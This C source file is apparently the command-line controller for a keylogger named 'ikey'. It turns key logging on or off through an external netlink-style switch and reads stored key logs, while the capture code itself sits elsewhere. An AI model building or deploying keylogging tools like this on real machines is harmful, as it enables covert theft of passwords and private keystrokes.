#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "key.h"

extern void readlog(void);
extern int nlswitch(int);

void usage(void)
{
	fprintf(stderr,					\
		"Usage: ikey [OPTION]\n"		\
		"options:\n"				\
		"	on	Switch on keylog\n"	\
		"	off	Switch off keylog\n"	\
		"	log	Read key logs\n"	\	
		"	help	Help Docs\n");
	exit(0);
}

int main(int argc, char **argv)
{
	if (argc != 2)
		usage();	
	
	if (strcmp(argv[1], "on") == 0)
		nlswitch(1);
	else if (strcmp(argv[1], "off") == 0)
		nlswitch(0);
	else if (strcmp(argv[1], "log") == 0)
		readlog();
	else
		usage();
	return 0;

}
